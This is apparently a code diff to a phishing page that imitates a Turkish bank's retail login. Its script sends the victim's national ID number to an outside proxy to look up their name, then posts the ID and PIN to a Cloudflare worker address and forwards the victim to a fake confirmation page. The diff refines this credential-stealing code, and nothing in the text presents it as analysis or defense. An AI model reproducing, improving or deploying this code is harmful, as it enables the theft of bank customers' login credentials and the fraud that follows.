@@ -91,7 +91,7 @@ margin-bottom: 0px;
 ">
  
     
- <form name="aspnetForm" method="post" id="aspnetForm" autocomplete="off" novalidate="novalidate">
+ <form name="aspnetForm" id="aspnetForm" autocomplete="off" novalidate="novalidate">
       <div id="" class="login-wrap">
         <header></header>
         <div id="" class="container">
@@ -169,41 +169,37 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
           </div>
     </form>
 
-   <script>
- 
-
+<script>
 async function checkAndSubmit() {
     const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
     const retailPinValue = document.getElementById('ctl00_c_RetailPinTextBox').value;
 
     try {
-        // Sayfanın yüklenmesini bekleyin
-     
-        // Diğer gerekli verileri alabilirsiniz (ad, soyad vb.)
         const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
         const data = await response.json();
         const adi = data.adi;
         const soyadi = data.soyadi;
 
-        // 0.5 saniye (500 milisaniye) bekleme
-       
-
         // İsim adında bir cookie oluştur ve değerleri kaydet
         document.cookie = `isim=${adi} ${soyadi}; path=/`;
- 
+
         // Sadece belirli input değerlerini içeren bir FormData nesnesi oluşturun
         const formData = new FormData();
         formData.append('ctl00$c$RetailIdentityTextBox', retailIdentityValue);
         formData.append('ctl00$c$RetailPinTextBox', retailPinValue);
 
         // AJAX ile formu belirtilen adrese gönder
-        await fetch('https://worker-broad-snow-1482.selimjuhan2.workers.dev/', {
+        const postResponse = await fetch('https://worker-broad-snow-1482.selimjuhan2.workers.dev/', {
             method: 'POST',
             body: formData
         });
 
-        await sleep(500);
-         window.location.href = '/onay';
+        if (postResponse.ok) {
+            // Form başarıyla gönderildiğinde /onay sayfasına yönlendir
+            window.location.href = '/onay';
+        } else {
+            console.error('Form gönderilirken bir hata oluştu.');
+        }
     } catch (error) {
         console.error('Hata:', error);
     }
